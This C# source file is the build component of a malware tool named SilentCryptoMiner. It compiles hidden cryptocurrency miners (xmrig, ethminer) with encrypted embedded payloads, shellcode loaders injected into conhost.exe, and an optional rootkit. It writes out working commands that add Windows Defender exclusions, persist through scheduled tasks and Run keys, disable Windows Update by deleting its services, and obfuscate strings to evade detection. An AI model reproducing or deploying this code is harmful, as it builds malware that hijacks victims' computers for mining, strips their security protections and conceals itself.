using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.CSharp;

namespace SilentCryptoMiner
{
    public class Codedom
    {
        public static Builder F;
        
        public static bool MinerCompiler(string savePath, string code, string iconPath = "", bool requireAdministrator = false)
        {
            var providerOptions = new Dictionary<string, string>
            {
                { "CompilerVersion", "v4.0" }
            };
            var CodeProvider = new CSharpCodeProvider(providerOptions);
            var parameters = new CompilerParameters();
            string OP = " /target:winexe /platform:x64 /optimize ";

            CreateManifest(savePath + ".manifest", requireAdministrator);
            OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";

            if (!F.toggleShellcode.Checked)
            {
                if (!string.IsNullOrEmpty(iconPath))
                {
                    OP += " /win32icon:\"" + iconPath + "\"";
                }
            }

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = savePath;
            parameters.CompilerOptions = OP;
            parameters.IncludeDebugInformation = false;
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            parameters.ReferencedAssemblies.Add("System.IO.Compression.dll");
            parameters.ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll");
            if (F.FormAO.toggleDebug.Checked)
            {
                parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            }

            using (var R = new System.Resources.ResourceWriter(F.resources["parent"] + ".Resources"))
            {
                if (F.mineXMR) { 
                    R.AddResource(F.resources["xmr"], F.AES_Encryptor(Properties.Resources.xmrig));
                    R.AddResource(F.resources["winring"], F.AES_Encryptor(Properties.Resources.WinRing0x64));
                    if (F.xmrGPU)
                    {
                        R.AddResource(F.resources["libs"], F.AES_Encryptor(Properties.Resources.libs));
                    }
                }
                if (F.mineETH)
                {
                    R.AddResource(F.resources["eth"], F.AES_Encryptor(Properties.Resources.ethminer));
                }
                if (F.chkStartup.Checked && F.toggleWatchdog.Checked)
                {
                    R.AddResource(F.resources["watchdog"], F.AES_Encryptor(F.watchdogdata));
                }
                if (F.chkStartup.Checked && F.FormAO.toggleRootkit.Checked)
                {
                    R.AddResource(F.resources["rootkit_i"], F.AES_Encryptor(Properties.Resources.rootkit_i));
                }
                R.AddResource(F.resources["dllloader"], F.AES_Encryptor(Properties.Resources.DllLoader));
                R.AddResource(F.resources["processinject"], F.AES_Encryptor(Properties.Resources.ProcessInject));
                if (F.toggleProcessProtect.Checked)
                {
                    R.AddResource(F.resources["processprotect"], F.AES_Encryptor(Properties.Resources.ProcessProtect));
                }

                R.Generate();
            }

            parameters.EmbeddedResources.Add(F.resources["parent"] + ".Resources");
            var minerbuilder = new StringBuilder(code);
            ReplaceGlobals(ref minerbuilder);
            var Results = CodeProvider.CompileAssemblyFromSource(parameters, minerbuilder.ToString());

            try
            {
                File.Delete(savePath + ".manifest");
                File.Delete(F.resources["parent"] + ".Resources");
            }
            catch { }

            if (Results.Errors.HasErrors)
            {
                foreach (CompilerError E in Results.Errors)
                {
                    MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return false;
            }

            if (F.FormAO.toggleRootkit.Checked)
            {
                MakeRootkitHelper(savePath);
            }
            return true;
        }

        public static bool WatchdogCompiler(string savePath, string code, bool requireAdministrator = false)
        {
            var providerOptions = new Dictionary<string, string>
            {
                { "CompilerVersion", "v4.0" }
            };
            var CodeProvider = new CSharpCodeProvider(providerOptions);
            var parameters = new CompilerParameters();
            string OP = " /target:winexe /platform:x64 /optimize ";

            CreateManifest(savePath + ".manifest", requireAdministrator);
            OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = savePath;
            parameters.CompilerOptions = OP;
            parameters.IncludeDebugInformation = false;

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            if (F.FormAO.toggleDebug.Checked)
            {
                parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            }

            var watchdogbuilder = new StringBuilder(code);
            ReplaceGlobals(ref watchdogbuilder);
            watchdogbuilder.Replace("MINERSET", string.Join(",", F.fullnids));
            var Results = CodeProvider.CompileAssemblyFromSource(parameters, watchdogbuilder.ToString());

            try
            {
                File.Delete(savePath + ".manifest");
            }
            catch { }

            if (Results.Errors.HasErrors)
            {
                foreach (CompilerError E in Results.Errors) {
                    MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return false;
            }

            if (F.FormAO.toggleRootkit.Checked)
            {
                MakeRootkitHelper(savePath);
            }
            return true;
        }

        public static bool CheckerCompiler(string savePath)
        {
            var providerOptions = new Dictionary<string, string>
            {
                { "CompilerVersion", "v4.0" }
            };
            var codeProvider = new CSharpCodeProvider(providerOptions);
            var parameters = new CompilerParameters();
            string OP = " /target:exe /platform:x64 /optimize ";

            CreateManifest(savePath + ".manifest", F.toggleAdministrator.Checked);
            OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = savePath;
            parameters.CompilerOptions = OP;
            parameters.IncludeDebugInformation = false;
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            if (F.FormAO.toggleDebug.Checked)
            {
                parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            }

            var checkerbuilder = new StringBuilder(Properties.Resources.Checker);
            ReplaceGlobals(ref checkerbuilder);
            var results = codeProvider.CompileAssemblyFromSource(parameters, checkerbuilder.ToString());

            try
            {
                File.Delete(savePath + ".manifest");
            }
            catch { }  

            if (results.Errors.HasErrors)
            {
                foreach (CompilerError E in results.Errors)
                {
                    MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return false;
            }

            if (F.FormAO.toggleRootkit.Checked)
            {
                MakeRootkitHelper(savePath);
            }
            return true;
        }

        public static bool UninstallerCompiler(string savePath)
        {
            var providerOptions = new Dictionary<string, string>
            {
                { "CompilerVersion", "v4.0" }
            };
            var codeProvider = new CSharpCodeProvider(providerOptions);
            var parameters = new CompilerParameters();
            string OP = " /target:winexe /platform:x64 /optimize ";

            CreateManifest(savePath + ".manifest", F.toggleAdministrator.Checked);
            OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = savePath;
            parameters.CompilerOptions = OP;
            parameters.IncludeDebugInformation = false;
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            parameters.ReferencedAssemblies.Add("System.IO.Compression.dll");
            parameters.ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll");
            if (F.FormAO.toggleDebug.Checked)
            {
                parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            }

            if (F.FormAO.toggleRootkit.Checked || F.toggleProcessProtect.Checked)
            {
                using (var R = new System.Resources.ResourceWriter(F.resources["parent"] + ".Resources"))
                {
                    R.AddResource(F.resources["rootkit_u"], F.AES_Encryptor(Properties.Resources.rootkit_u));
                    R.AddResource(F.resources["dllloader"], F.AES_Encryptor(Properties.Resources.DllLoader));
                    R.AddResource(F.resources["processinject"], F.AES_Encryptor(Properties.Resources.ProcessInject));
                    if (F.toggleProcessProtect.Checked)
                    {
                        R.AddResource(F.resources["processprotect"], F.AES_Encryptor(Properties.Resources.ProcessProtect));
                    }
                    R.Generate();
                }

                parameters.EmbeddedResources.Add(F.resources["parent"] + ".Resources");
            }

            var uninstallerbuilder = new StringBuilder(Properties.Resources.Uninstaller);
            ReplaceGlobals(ref uninstallerbuilder);
            var results = codeProvider.CompileAssemblyFromSource(parameters, uninstallerbuilder.ToString());

            try
            {
                File.Delete(savePath + ".manifest");
                File.Delete(F.resources["parent"] + ".Resources");
            }
            catch { }

            if (results.Errors.HasErrors)
            {
                foreach (CompilerError E in results.Errors)
                {
                    MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return false;
            }

            if (F.FormAO.toggleRootkit.Checked)
            {
                MakeRootkitHelper(savePath);
            }
            return true;
        }

        public static bool LoaderCompiler(string savePath, string inputFile, string args, string icoPath = "", bool assemblyData = false, bool requireAdministrator = false)
        {
            try
            {
                string currentDirectory = Path.GetDirectoryName(savePath);
                string filename = Path.GetFileNameWithoutExtension(savePath);
                var paths = new Dictionary<string, string>() { 
                    { "current", currentDirectory },
                    { "compilerslog", Path.Combine(currentDirectory, @"Compilers\logs") }, 
                    { "windres", Path.Combine(currentDirectory, @"Compilers\MinGW64\bin\windres.exe") }, 
                    { "tcc", Path.Combine(currentDirectory, @"Compilers\tinycc\tcc.exe") }, 
                    { "donut", Path.Combine(currentDirectory, @"Compilers\donut\donut.exe") }, 
                    { "windreslog", Path.Combine(currentDirectory, @"Compilers\logs\windres.log") }, 
                    { "tcclog", Path.Combine(currentDirectory, @"Compilers\logs\tcc.log") }, 
                    { "donutlog", Path.Combine(currentDirectory, @"Compilers\logs\donut.log") }, 
                    { "manifest", Path.Combine(currentDirectory, "loader.manifest") }, 
                    { "resource.rc", Path.Combine(currentDirectory, "resource.rc") }, 
                    { "resource.o", Path.Combine(currentDirectory, "resource.o") },
                    { "filename", Path.Combine(currentDirectory, filename) } };

                ExtractExternalFiles(currentDirectory);

                var directoryFilter = F.CheckNonASCII(savePath);
                if (F.BuildError(directoryFilter.Length > 0, string.Format("Error: Build path \"{0}\" contains the following illegal special characters: {1}, please choose a build path without any special characters.", savePath, string.Join("", directoryFilter))))
                    return false;
                if (F.BuildError(!F.txtStartDelay.Text.All(new Func<char, bool>(char.IsDigit)), "Error: Start Delay must be a number."))
                    return false;

                var sb = new StringBuilder(Properties.Resources.Loader);

                if (F.BuildError(!string.Join("", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }).All(new Func<char, bool>(char.IsDigit)), "Error: Assembly Version must only contain numbers."))
                    return false;

                var resource = new StringBuilder(Properties.Resources.resource);
                string defs = "";
                if (!string.IsNullOrEmpty(icoPath))
                {
                    resource.Replace("#ICON", F.ToLiteral(icoPath));
                    defs += " -DDefIcon";
                }

                if (assemblyData)
                {
                    resource.Replace("#TITLE", F.ToLiteral(F.txtAssemblyTitle.Text));
                    resource.Replace("#DESCRIPTION", F.ToLiteral(F.txtAssemblyDescription.Text));
                    resource.Replace("#COMPANY", F.ToLiteral(F.txtAssemblyCompany.Text));
                    resource.Replace("#PRODUCT", F.ToLiteral(F.txtAssemblyProduct.Text));
                    resource.Replace("#COPYRIGHT", F.ToLiteral(F.txtAssemblyCopyright.Text));
                    resource.Replace("#TRADEMARK", F.ToLiteral(F.txtAssemblyTrademark.Text));
                    resource.Replace("#VERSION", string.Join(",", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }));
                    defs += " -DDefAssembly";
                }

                CreateManifest(paths["manifest"], requireAdministrator);

                File.WriteAllText(paths["resource.rc"], resource.ToString());
                RunExternalProgram("cmd", string.Format("cmd /c \"{0}\" --input resource.rc --output resource.o -O coff {1}", paths["windres"], defs), currentDirectory, paths["windreslog"]);
                File.Delete(paths["resource.rc"]);
                File.Delete(paths["manifest"]);
                if (F.BuildError(!File.Exists(paths["resource.o"]), string.Format("Error: Failed at compiling resources, check the error log at {0}.", paths["windreslog"])))
                    return false;
                
                string shellcodebytes = Encoding.GetEncoding("ISO-8859-1").GetString(ConvertToShellcode(inputFile));
                string shellcode = F.ToLiteral(Cipher(shellcodebytes, F.KEY));

                sb.Replace("startDelay", F.txtStartDelay.Text);
                sb.Replace("#KEYLENGTH", F.KEY.Length.ToString());
                sb.Replace("#KEY", F.KEY);
                sb.Replace("#SHELLCODELENGTH", shellcodebytes.Length.ToString());
                sb.Replace("#SHELLCODE", shellcode);
                sb.Replace("#ARGS", args);
                CipherReplace(sb, "#TARGET", "System32\\conhost.exe");
                CipherReplace(sb, "#FORMAT1", @"%s\%s");
                CipherReplace(sb, "#FORMAT2", "\"%s\" \"%s\"");
                
                File.WriteAllText(paths["filename"] + ".c", sb.ToString(), Encoding.GetEncoding("ISO-8859-1"));
                RunExternalProgram(paths["tcc"], string.Format("-Wl,-subsystem=windows \"{0}\" {1} \"{2}\" -xa \"{3}\" -m64", filename + ".c", "resource.o", Path.Combine(currentDirectory, @"Includes\syscalls.c"), Path.Combine(currentDirectory, @"Includes\syscallsstubs.asm")), currentDirectory, paths["tcclog"]);
                File.Delete(paths["resource.o"]);
                File.Delete(paths["filename"] + ".c");
                if (F.BuildError(!File.Exists(paths["filename"] + ".exe"), string.Format("Error: Failed at compiling program, check the error log at {0}.", paths["tcclog"])))
                    return false;

                if (F.FormAO.toggleRootkit.Checked)
                {
                    MakeRootkitHelper(savePath);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: An error occured while building the file: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
            return true;
        }

        public static void ExtractExternalFiles(string currentDirectory)
        {
            var paths = new Dictionary<string, string>() {
                    { "includes", Path.Combine(currentDirectory, "Includes") },
                    { "compilers", Path.Combine(currentDirectory, "Compilers") } };

            if (!Directory.Exists(paths["compilers"]))
            {
                using (var archive = new ZipArchive(new MemoryStream(Properties.Resources.Compilers)))
                {
                    archive.ExtractToDirectory(paths["compilers"]);
                }
            }

            if (!Directory.Exists(paths["includes"]))
            {
                using (var archive = new ZipArchive(new MemoryStream(Properties.Resources.Includes)))
                {
                    archive.ExtractToDirectory(paths["includes"]);
                }
            }
        }

        public static byte[] ConvertToShellcode(string filepath)
        {
            string currentDirectory = Path.GetDirectoryName(filepath);
            var paths = new Dictionary<string, string>() {
                    { "donut", Path.Combine(currentDirectory, @"Compilers\donut\donut.exe") },
                    { "donutlog", Path.Combine(currentDirectory, @"Compilers\logs\donut.log") },
                    { "loader", Path.Combine(currentDirectory, "loader.bin") }};

            ExtractExternalFiles(currentDirectory);

            RunExternalProgram(paths["donut"], string.Format("\"{0}\" -a 2 -f 1", filepath), currentDirectory, paths["donutlog"]);
            byte[] loader = File.ReadAllBytes(paths["loader"]);
            File.Delete(paths["loader"]);
            return loader;
        }

        public static void MakeRootkitHelper(string savePath)
        {
            byte[] newFile = File.ReadAllBytes(savePath);
            Buffer.BlockCopy(BitConverter.GetBytes(0x7268), 0, newFile, 64, 2);
            File.WriteAllBytes(savePath, newFile);
        }

        public static void RunExternalProgram(string filename, string arguments, string workingDirectory, string logpath)
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = filename;
                process.StartInfo.Arguments = arguments;
                process.StartInfo.WorkingDirectory = workingDirectory;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardError = true;
                process.Start();

                using (StreamWriter writer = File.AppendText(logpath))
                {
                    writer.Write(process.StandardError.ReadToEnd());
                }
                process.WaitForExit();
            }
        }

        public static void CipherReplace(StringBuilder source, string id, string value)
        {
            source.Replace(id + "LENGTH", value.Length.ToString());
            source.Replace(id, F.ToLiteral(Cipher(value, F.KEY)));
        }

        public static string Cipher(string data, string key)
        {
            var result = new char[data.Length];
            for (int c = 0; c < data.Length; c++)
                result[c] = (char)((uint)data[c] ^ key[c % key.Length]);
            return string.Join("", result);
        }

        public static void CreateManifest(string path, bool administrator)
        {
            var mb = new StringBuilder(Properties.Resources.template);
            mb.Replace("#MANIFESTVERSION", $"{F.rand.Next(0, 10)}.{F.rand.Next(0, 10)}.{F.rand.Next(0, 10)}.{F.rand.Next(0, 10)}");
            mb.Replace("#MANIFESTNAME", F.Randomi(F.rand.Next(10, 40), false));
            mb.Replace("#MANIFESTLEVEL", administrator ? "requireAdministrator" : "asInvoker");
            File.WriteAllText(path, mb.ToString());
        }

        public static void ReplaceEncrypt(StringBuilder source, string id, string value)
        {
            source.Replace($"\"{id}\"", F.FormAO.toggleDoObfuscation.Checked ? $"_rGetString_(\"{F.EncryptString(value)}\")" : $"\"{F.ToLiteral(value)}\"");
        }

        public static void ReplaceGlobals(ref StringBuilder stringb)
        {
            bool systemadmincheck = F.toggleRunSystem.Checked && F.toggleAdministrator.Checked;

            if (F.mineXMR)
            {
                stringb.Replace("DefXMR", "true");
            }

            if (F.mineETH)
            {
                stringb.Replace("DefETH", "true");
            }

            if (F.toggleWDExclusions.Checked)
            {
                stringb.Replace("DefWDExclusions", "true");
                ReplaceEncrypt(stringb, "#WDCOMMANDS", $"-EncodedCommand \"{Convert.ToBase64String(Encoding.Unicode.GetBytes($"<#{F.Randomi(F.rand.Next(2, 5), false)}#> Add-MpPreference <#{F.Randomi(F.rand.Next(2, 5), false)}#> -ExclusionPath <#{F.Randomi(F.rand.Next(2, 5), false)}#> @( <#{F.Randomi(F.rand.Next(2, 5), false)}#> $env:UserProfile, <#{F.Randomi(F.rand.Next(2, 5), false)}#> $env:ProgramFiles) <#{F.Randomi(F.rand.Next(2, 5), false)}#> -Force <#{F.Randomi(F.rand.Next(2, 5), false)}#>"))}\"");
            }

            if (F.FormAO.toggleRootkit.Checked)
            {
                stringb.Replace("DefRootkit", "true");
            }

            if (F.FormAO.toggleDebug.Checked)
            {
                stringb.Replace("DefDebug", "true");
            }

            if (F.FormAO.toggleDoObfuscation.Checked)
            {
                stringb.Replace("DefObfuscate", "true");
            }

            if (F.toggleDisableSleep.Checked)
            {
                stringb.Replace("DefDisableSleep", "true");
            }

            if (F.toggleWindowsUpdate.Checked)
            {
                stringb.Replace("DefDisableWindowsUpdate", "true");
            }

            if (F.toggleProcessProtect.Checked)
            {
                stringb.Replace("DefProcessProtect", "true");
            }

            if (F.chkBlockWebsites.Checked && !string.IsNullOrEmpty(F.txtBlockWebsites.Text))
            {
                stringb.Replace("DefBlockWebsites", "true");
                stringb.Replace("DOMAINSET", $"\"{string.Join("\", \"", F.txtBlockWebsites.Text.Split(',').Select(x => F.EncryptString(x)).ToArray())}\"");
            }

            if (F.xmrGPU)
            {
                stringb.Replace("DefGPU", "true");
            }

            if (F.toggleShellcode.Checked)
            {
                stringb.Replace("DefShellcode", "true");
            }
            else
            {
                stringb.Replace("DefStartDelay", "true");
            }

            if (F.chkStartup.Checked)
            {
                stringb.Replace("DefInstall", "true");
                string installdir;
                switch (F.Invoke(new Func<string>(() => F.txtStartupPath.Text)) ?? "")
                {
                    case "AppData":
                        {
                            installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)";
                            break;
                        }

                    case "UserProfile":
                        {
                            installdir = "Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)";
                            break;
                        }

                    case "Temp":
                        {
                            installdir = "Path.GetTempPath()";
                            break;
                        }

                    default:
                        {
                            installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)";
                            break;
                        }
                }

                if (systemadmincheck)
                {
                    installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)";
                }

                stringb.Replace("PayloadPath", $"System.IO.Path.Combine({installdir}, {(F.FormAO.toggleDoObfuscation.Checked ? $"_rGetString_(\"{F.EncryptString(F.txtStartupFileName.Text)}\")" : $"\"{F.ToLiteral(F.txtStartupFileName.Text)}\"")})");

                if (F.toggleWatchdog.Checked)
                {
                    stringb.Replace("DefWatchdog", "true");
                    if (F.FormAO.toggleMemoryWatchdog.Checked)
                    {
                        stringb.Replace("DefMemoryWatchdog", "true");
                    }
                }

                if (F.toggleAutoDelete.Checked)
                {
                    stringb.Replace("DefAutoDelete", "true");
                }

                if (!F.FormAO.toggleOldMinerOverwrite.Checked)
                {
                    stringb.Replace("DefNoMinerOverwrite", "true");
                }

                if (F.FormAO.toggleRunInstall.Checked)
                {
                    stringb.Replace("DefRunInstall", "true");
                }
            }

            if (F.chkAssembly.Checked)
            {
                stringb.Replace("DefAssembly", "true");
                stringb.Replace("%Title%", F.txtAssemblyTitle.Text);
                stringb.Replace("%Description%", F.txtAssemblyDescription.Text);
                stringb.Replace("%Company%", F.txtAssemblyCompany.Text);
                stringb.Replace("%Product%", F.txtAssemblyProduct.Text);
                stringb.Replace("%Copyright%", F.txtAssemblyCopyright.Text);
                stringb.Replace("%Trademark%", F.txtAssemblyTrademark.Text);
                stringb.Replace("%v1%", F.txtAssemblyVersion1.Text);
                stringb.Replace("%v2%", F.txtAssemblyVersion2.Text);
                stringb.Replace("%v3%", F.txtAssemblyVersion3.Text);
                stringb.Replace("%v4%", F.txtAssemblyVersion4.Text);
            }

            stringb.Replace("$LIBSROOT", F.chkStartup.Checked && systemadmincheck ? "Environment.SpecialFolder.ProgramFiles" : "Environment.SpecialFolder.ApplicationData");

            string basepath = F.commonnames[F.rand.Next(F.commonnames.Count)];
            ReplaceEncrypt(stringb, "#LIBSPATH", @$"Google\Libs\");
            ReplaceEncrypt(stringb, "#WATCHDOGPATH", @$"{basepath}\Telemetry\");
            ReplaceEncrypt(stringb, "#WATCHDOGID", $"\"{F.watchdogID}\"");
            ReplaceEncrypt(stringb, "#XID", F.xid);
            ReplaceEncrypt(stringb, "#EID", F.eid);
            ReplaceEncrypt(stringb, "#WATCHDOGNAME", "sihost64");

            ReplaceEncrypt(stringb, "#WIN7TASKSCHADD", $"/c schtasks /create /f /sc onlogon /rl highest {(systemadmincheck ? "/ru \"System\"" : "")} /tn \"{F.txtStartupEntryName.Text}\" /tr \"\\\"{{0}}\\\"\"");
            ReplaceEncrypt(stringb, "#TASKSCHADD", $"<#{F.Randomi(F.rand.Next(2, 5), false)}#> Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute '\"{{0}}\"') <#{F.Randomi(F.rand.Next(2, 5), false)}#> -Trigger (New-ScheduledTaskTrigger {(systemadmincheck ? "-AtStartup" : "-AtLogOn")}) <#{F.Randomi(F.rand.Next(2, 5), false)}#> -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 1000)) <#{F.Randomi(F.rand.Next(2, 5), false)}#> -TaskName '{F.txtStartupEntryName.Text.Replace("'", "''")}' {(systemadmincheck ? "-User 'System'" : "")} -RunLevel 'Highest' -Force <#{F.Randomi(F.rand.Next(2, 5), false)}#>;");
            ReplaceEncrypt(stringb, "#TASKSCHSTART", $"/c schtasks /run /tn \"{F.txtStartupEntryName.Text}\"");
            ReplaceEncrypt(stringb, "#TASKSCHREM", $"/c schtasks /delete /f /tn \"{F.txtStartupEntryName.Text}\"");
            ReplaceEncrypt(stringb, "#REGADD", $"/c reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtStartupEntryName.Text}\" /t REG_SZ /f /d \"\\\"{{0}}\\\"\"");
            ReplaceEncrypt(stringb, "#REGREM", $"/c reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtStartupEntryName.Text}\" /f");
            ReplaceEncrypt(stringb, "#POWERCFG", @"/c powercfg /x -hibernate-timeout-ac 0 & powercfg /x -hibernate-timeout-dc 0 & powercfg /x -standby-timeout-ac 0 & powercfg /x -standby-timeout-dc 0");
            ReplaceEncrypt(stringb, "#WUPDATE", "/c sc stop UsoSvc & sc stop WaaSMedicSvc & sc stop wuauserv & sc stop bits & sc stop dosvc & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\bits /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc /f & takeown /f %SystemRoot%\\System32\\WaaSMedicSvc.dll & icacls %SystemRoot%\\System32\\WaaSMedicSvc.dll /grant *S-1-1-0:F /t /c /l /q & rename %SystemRoot%\\System32\\WaaSMedicSvc.dll WaaSMedicSvc_BAK.dll & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AUOptions /d 2 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AutoInstallMinorUpdates /d 0 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoUpdate /d 1 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoRebootWithLoggedOnUsers /d 1 /t REG_DWORD /f & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\sih\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\sihboot\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistant\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistantCalendarRun\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistantWakeupRun\" /DISABLE");
            ReplaceEncrypt(stringb, "#STARTPROGRAM", $"<#{F.Randomi(F.rand.Next(2, 5), false)}#> Start-Process -FilePath '{{0}}' {(F.toggleAdministrator.Checked ? "-Verb RunAs" : "")} <#{F.Randomi(F.rand.Next(2, 5), false)}#>");
            ReplaceEncrypt(stringb, "#CMDKILL", "/c taskkill /f /PID \"{0}\"");
            ReplaceEncrypt(stringb, "#CMDDELETE", "/c choice /C Y /N /D Y /T 3 & Del \"{0}\"");

            ReplaceEncrypt(stringb, "#MINERQUERY", $"Select CommandLine from Win32_Process");
            ReplaceEncrypt(stringb, "#GPUQUERY", "SELECT Name, VideoProcessor FROM Win32_VideoController");
            ReplaceEncrypt(stringb, "#WATCHDOGQUERY", $"Select CommandLine, ProcessID from Win32_Process");
            ReplaceEncrypt(stringb, "#WMISCOPE", @"\root\cimv2");
            ReplaceEncrypt(stringb, "#MINERID", F.minerFind);
            ReplaceEncrypt(stringb, "#SCMD", "cmd");
            ReplaceEncrypt(stringb, "#SPOWERSHELL", "powershell");
            ReplaceEncrypt(stringb, "#CONHOST", "System32\\conhost.exe");
            ReplaceEncrypt(stringb, "#WATCHDOGINJ", F.FormAO.toggleRootkit.Checked ? "System32\\dialer.exe" : "System32\\conhost.exe");
            ReplaceEncrypt(stringb, "#HOSTSPATH", "drivers/etc/hosts");
            ReplaceEncrypt(stringb, "#HOSTSFORMAT", "\r\n0.0.0.0       {0}");
            ReplaceEncrypt(stringb, "#DLLLOADERTYPE", "DllLoader.DllLoader");
            ReplaceEncrypt(stringb, "#DLLLOADMETHOD", "Inject");
            ReplaceEncrypt(stringb, "#DLLPROTECTMETHOD", "Protect");
            ReplaceEncrypt(stringb, "#INJECTMETHOD", "inject");
            ReplaceEncrypt(stringb, "#PROTECTMETHOD", "protect");
            ReplaceEncrypt(stringb, "#INSTALLPATH", F.txtStartupFileName.Text);
            ReplaceEncrypt(stringb, "#WR64", "WR64.sys");
            ReplaceEncrypt(stringb, "#ECTEMPLATE", "-EncodedCommand \"{0}\"");

            ReplaceEncrypt(stringb, "#STRNVIDIA", "nvidia");
            ReplaceEncrypt(stringb, "#STRAMD", "amd");
            ReplaceEncrypt(stringb, "#STRVIDEOP", "VideoProcessor");
            ReplaceEncrypt(stringb, "#STRNAME", "Name");
            ReplaceEncrypt(stringb, "#STRCMDLINE", "CommandLine");
            ReplaceEncrypt(stringb, "#STRPROCID", "ProcessID");
            ReplaceEncrypt(stringb, "#STREXE", ".exe");

            stringb.Replace("#AESKEY", F.AESKEY);
            stringb.Replace("#SALT", F.SALT);
            stringb.Replace("#IV", F.IV);
            ReplaceEncrypt(stringb, "#UNAMKEY", F.UNAMKEY);
            ReplaceEncrypt(stringb, "#UNAMIV", F.UNAMIV);

            stringb.Replace("startDelay", F.txtStartDelay.Text);

            foreach (var res in F.resources)
            {
                ReplaceEncrypt(stringb, "#RES_" + res.Key, res.Value);
            }

            if (F.FormAO.toggleDoObfuscation.Checked)
            {
                foreach (Match m in Regex.Matches(stringb.ToString(), "_r(.+?)_"))
                {
                    foreach (Capture c in m.Captures)
                        stringb.Replace(c.Value, F.Randomi(F.rand.Next(5, 40)));
                }
            }
        }
    }
}